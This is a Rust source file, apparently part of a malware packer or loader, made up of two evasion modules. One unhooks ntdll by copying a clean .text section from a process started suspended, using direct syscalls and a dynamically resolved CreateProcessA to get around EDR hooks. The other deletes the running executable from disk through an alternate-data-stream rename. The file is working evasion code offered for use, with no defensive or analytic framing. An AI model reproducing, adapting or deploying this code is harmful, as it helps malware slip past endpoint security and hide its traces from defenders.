use std::ffi::c_void;

#[cfg(feature = "EvasionNtdllUnhooking")]
use std::ptr::null_mut;

#[cfg(feature = "EvasionNtdllUnhooking")]
use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpebteb::PEB,
};

#[cfg(feature = "EvasionNtdllUnhooking")]
use rust_syscalls::syscall;

#[cfg(feature = "EvasionNtdllUnhooking")]
use windows_sys::Win32::System::{
    Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
    SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
    Threading::{PROCESS_INFORMATION, STARTUPINFOA},
    LibraryLoader::GetModuleHandleA,
};

// =======================================================================================================
// EVASION: NTDLL UNHOOKING
// =======================================================================================================

/// Unhooks NTDLL by copying clean .text section from a suspended process
#[cfg(feature = "EvasionNtdllUnhooking")]
pub fn unhook_ntdll() -> Result<(), &'static str> {
    unsafe {
        // Path to the target process to be created in suspended mode
        let process = b"C:\\Windows\\System32\\ScreenMagnifier.exe\0";

        // Retrieve base address of ntdll.dll from current process
        let module = get_ntdll_address();
        
        // Create a new suspended process
        let si = STARTUPINFOA {
            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
            ..std::mem::zeroed()
        };
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        
        // Dynamically load CreateProcessA to avoid direct import
        type CreateProcessAFn = unsafe extern "system" fn(
            *const u8, *mut u8, *mut c_void, *mut c_void,
            i32, u32, *mut c_void, *const u8,
            *const STARTUPINFOA, *mut PROCESS_INFORMATION
        ) -> i32;
        
        let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
        let create_process_addr = windows_sys::Win32::System::LibraryLoader::GetProcAddress(
            kernel32,
            b"CreateProcessA\0".as_ptr()
        );
        
        if create_process_addr.is_none() {
            return Err("Failed to resolve CreateProcessA");
        }
        
        let create_process: CreateProcessAFn = std::mem::transmute(create_process_addr.unwrap());
        
        let result = create_process(
            std::ptr::null_mut(),
            process.as_ptr() as *mut u8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0x00000004, // CREATE_SUSPENDED
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &si,
            &mut pi,
        );
        
        if result == 0 {
            return Err("Failed to create suspended process");
        }
        
        // Validate DOS header of ntdll
        let dos_header = module as *mut IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            return Err("Invalid DOS signature");
        }
    
        // Validate NT header of ntdll
        let nt_header = ((*dos_header).e_lfanew as usize + module as usize) as *mut IMAGE_NT_HEADERS64;
        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            return Err("Invalid NT signature");
        }
    
        // Allocate buffer to hold a clean copy of ntdll.dll from the suspended process using NtAllocateVirtualMemory
        let size_image = (*nt_header).OptionalHeader.SizeOfImage;
        let mut buffer_ntdll: *mut c_void = null_mut();
        let mut region_size: usize = size_image as usize;
        
        let status: i32 = syscall!(
            "NtAllocateVirtualMemory",
            -1isize as *mut c_void, // Current process handle
            &mut buffer_ntdll as *mut *mut c_void,
            0usize,
            &mut region_size as *mut usize,
            0x00003000u32, // MEM_COMMIT | MEM_RESERVE
            0x04u32 // PAGE_READWRITE
        );
        
        if status != 0 || buffer_ntdll.is_null() {
            return Err("Failed to allocate virtual memory");
        }
        
        // Read clean ntdll from suspended process using NtReadVirtualMemory
        let mut number_bytes: usize = 0;
        let status: i32 = syscall!(
            "NtReadVirtualMemory",
            pi.hProcess,
            module as *mut c_void,
            buffer_ntdll,
            size_image as usize,
            &mut number_bytes as *mut usize
        );
        
        if status != 0 {
            return Err("Failed to read process memory");
        }
    
        // Locate the .text section (code section) of ntdll
        let section_header = (nt_header as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;
        let mut tmp_nt_local = null_mut();
        let mut tmp_nt_process = null_mut();
        let mut ntdll_txt_size = 0;
        
        for i in 0..(*nt_header).FileHeader.NumberOfSections {
            let section = (*section_header.add(i as usize)).Name;
            let name = std::str::from_utf8(&section)
                .unwrap_or("")
                .trim_matches('\0');
            
            if name == ".text" {
                tmp_nt_local = (module as usize + (*section_header.add(i as usize)).VirtualAddress as usize) as *mut c_void;
                tmp_nt_process = (buffer_ntdll as usize + (*section_header.add(i as usize)).VirtualAddress as usize) as *mut c_void;
                ntdll_txt_size = (*section_header.add(i as usize)).Misc.VirtualSize as usize;
                break;
            }
        }
        
        if tmp_nt_local.is_null() || tmp_nt_process.is_null() {
            return Err("Failed to locate .text section");
        }
    
        // Change protection to allow overwriting the hooked .text section using NtProtectVirtualMemory
        let mut old_protect: u32 = 0;
        let mut protect_size: usize = ntdll_txt_size;
        let status: i32 = syscall!(
            "NtProtectVirtualMemory",
            -1isize as *mut c_void, // Current process handle
            &mut tmp_nt_local as *mut *mut c_void,
            &mut protect_size as *mut usize,
            0x40u32, // PAGE_EXECUTE_READWRITE
            &mut old_protect as *mut u32
        );
        
        if status != 0 {
            return Err("Failed to change memory protection");
        }
    
        // Overwrite the hooked .text section with the clean one
        std::ptr::copy_nonoverlapping(
            tmp_nt_process as *const u8,
            tmp_nt_local as *mut u8,
            ntdll_txt_size
        );
    
        // Restore original protection using NtProtectVirtualMemory
        let mut restore_size: usize = ntdll_txt_size;
        syscall!(
            "NtProtectVirtualMemory",
            -1isize as *mut c_void,
            &mut tmp_nt_local as *mut *mut c_void,
            &mut restore_size as *mut usize,
            old_protect,
            &mut old_protect as *mut u32
        );

        Ok(())
    }
}

#[cfg(feature = "EvasionNtdllUnhooking")]
fn get_ntdll_address() -> *mut c_void {
    unsafe {
        let peb = nt_current_peb();
        let ldr_data = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(if cfg!(target_arch = "x86_64") { -0x10 } else { -0x08 }) 
            as *const LDR_DATA_TABLE_ENTRY;
        
        (*ldr_data).DllBase as *mut c_void
    }
}

#[cfg(feature = "EvasionNtdllUnhooking")]
#[inline(always)]
#[allow(non_snake_case)]
fn nt_current_peb() -> *const PEB {
    unsafe {
        #[cfg(target_arch = "x86_64")]
        return __readgsqword(0x60) as *const PEB;

        #[cfg(target_arch = "x86")]
        return __readfsdword(0x30) as *const PEB;
    }
}

#[cfg(feature = "EvasionNtdllUnhooking")]
#[inline(always)]
#[cfg(target_arch = "x86_64")]
unsafe fn __readgsqword(offset: u64) -> u64 {
    let out: u64;
    core::arch::asm!(
        "mov {}, gs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, pure, readonly),
    );
    out
}

#[cfg(feature = "EvasionNtdllUnhooking")]
#[inline(always)]
#[cfg(target_arch = "x86")]
unsafe fn __readfsdword(offset: u32) -> u32 {
    let out: u32;
    core::arch::asm!(
        "mov {:e}, fs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, pure, readonly),
    );
    out
}

// =======================================================================================================
// EVASION: SELF DELETION
// =======================================================================================================

#[cfg(feature = "EvasionSelfDeletion")]
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE},
    Storage::FileSystem::{
        CreateFileW, FileDispositionInfo, FileRenameInfo, SetFileInformationByHandle,
        DELETE, FILE_SHARE_READ, OPEN_EXISTING, SYNCHRONIZE,
    },
    System::Memory::{GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY},
};

#[cfg(feature = "EvasionSelfDeletion")]
#[repr(C)]
struct FILE_RENAME_INFO {
    flags: u32,
    root_directory: HANDLE,
    file_name_length: u32,
    file_name: [u16; 1], // Variable length array
}

#[cfg(feature = "EvasionSelfDeletion")]
#[repr(C)]
struct FILE_DISPOSITION_INFO {
    delete_file: u8,
}

#[cfg(feature = "EvasionSelfDeletion")]
pub fn delete_self_from_disk() -> Result<(), i32> {
    unsafe {
        let stream = ":PickerPacker";
        let stream_wide: Vec<u16> = stream.encode_utf16().chain(Some(0)).collect();
        
        let mut delete_file = FILE_DISPOSITION_INFO { delete_file: 1 };
        
        // Allocate FILE_RENAME_INFO with variable-length filename
        let length = std::mem::size_of::<FILE_RENAME_INFO>() + (stream_wide.len() * std::mem::size_of::<u16>());
        let rename_info = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, length) as *mut FILE_RENAME_INFO;
        
        if rename_info.is_null() {
            return Err(GetLastError() as i32);
        }
        
        // Set up rename info
        (*rename_info).flags = 0;
        (*rename_info).root_directory = std::ptr::null_mut();
        (*rename_info).file_name_length = (stream_wide.len() * std::mem::size_of::<u16>()) as u32 - 2;
        
        // Copy stream name into FileName
        std::ptr::copy_nonoverlapping(
            stream_wide.as_ptr(),
            (*rename_info).file_name.as_mut_ptr(),
            stream_wide.len(),
        );
        
        // Get current executable path
        let path = std::env::current_exe().map_err(|_| GetLastError() as i32)?;
        let path_str = path.to_str().ok_or(GetLastError() as i32)?;
        let full_path: Vec<u16> = path_str.encode_utf16().chain(Some(0)).collect();
        
        // Step 1: Rename to alternate data stream
        let mut h_file = CreateFileW(
            full_path.as_ptr(),
            DELETE | SYNCHRONIZE,
            FILE_SHARE_READ,
            std::ptr::null(),
            OPEN_EXISTING,
            0,
            std::ptr::null_mut(),
        );
        
        if h_file.is_null() || h_file == -1isize as HANDLE {
            HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, rename_info as *const c_void);
            return Err(GetLastError() as i32);
        }
        
        let result = SetFileInformationByHandle(
            h_file,
            FileRenameInfo,
            rename_info as *const c_void,
            length as u32,
        );
        
        if result == 0 {
            CloseHandle(h_file);
            HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, rename_info as *const c_void);
            return Err(GetLastError() as i32);
        }
        
        CloseHandle(h_file);
        
        // Step 2: Reopen and mark for deletion
        h_file = CreateFileW(
            full_path.as_ptr(),
            DELETE | SYNCHRONIZE,
            FILE_SHARE_READ,
            std::ptr::null(),
            OPEN_EXISTING,
            0,
            std::ptr::null_mut(),
        );
        
        if h_file.is_null() || h_file == -1isize as HANDLE {
            HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, rename_info as *const c_void);
            return Err(GetLastError() as i32);
        }
        
        let result = SetFileInformationByHandle(
            h_file,
            FileDispositionInfo,
            &delete_file as *const FILE_DISPOSITION_INFO as *const c_void,
            std::mem::size_of::<FILE_DISPOSITION_INFO>() as u32,
        );
        
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, rename_info as *const c_void);
        
        if result == 0 {
            CloseHandle(h_file);
            return Err(GetLastError() as i32);
        }
        
        // DON'T close the handle - keep it open until process exits
        // This ensures the deletion flag persists
        // CloseHandle(h_file);
        
        Ok(())
    }
}
